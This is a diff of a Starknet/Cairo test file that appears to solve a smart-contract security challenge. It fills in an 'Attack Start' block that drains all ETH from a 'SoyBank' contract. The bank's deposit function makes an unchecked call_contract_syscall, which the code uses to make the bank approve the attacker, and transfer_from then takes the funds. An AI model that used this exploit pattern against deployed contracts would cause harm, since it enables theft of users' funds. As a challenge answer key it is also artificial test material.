@@ -2,12 +2,12 @@ use system_call_attacks::hook_me_up::soy_bank::{
     ISoyBankDispatcher, ISoyBankDispatcherTrait,
 };
 use system_call_attacks::utils::helpers;
-use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
+use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
 use snforge_std::{
-    ContractClassTrait, DeclareResultTrait, declare, start_cheat_block_timestamp,
+    ContractClassTrait, DeclareResultTrait, declare,
     start_cheat_caller_address, stop_cheat_caller_address,
 };
-use starknet::{ClassHash, ContractAddress};
+use starknet::ContractAddress;
 
 fn deploy_bank(currency: ContractAddress) -> (ContractAddress, ISoyBankDispatcher) {
     let contract_class = declare("SoyBank").unwrap().contract_class();
@@ -54,7 +54,34 @@ fn test_system_calls_2() {
     assert_eq!(bank_balance, 30 * ONE_ETH);
 
     // Attack Start //
-    // TODO: Steal all ETH from the bank to the attacker
+    // Steal all ETH from the bank
+
+    // Approve bank to spend 1 wei
+    // we will steal this back later
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.approve(bank_address, 1);
+    stop_cheat_caller_address(eth_address);
+
+    // Amount to steal
+    let amount: u256 = 30 * ONE_ETH + 1;
+
+    // approve call data
+    let approve_selector = selector!("approve");
+    let mut approve_calldata: Array<felt252> = array![];
+    Serde::serialize(@attacker, ref approve_calldata);
+    Serde::serialize(@amount, ref approve_calldata);
+
+    // call deposit function on bank
+    // since the deposit function calls `call_contract_syscall` without checks
+    // we make it call the `approve` function on the `eth_address`
+    start_cheat_caller_address(bank_address, attacker);
+    bank_dispatcher.deposit(1, eth_address, approve_selector, approve_calldata.span());
+    stop_cheat_caller_address(bank_address);
+
+    // After obtaining approval we transfer the eth
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.transfer_from(bank_address, attacker, amount);
+    stop_cheat_caller_address(eth_address);
 
     // Attack End //
 
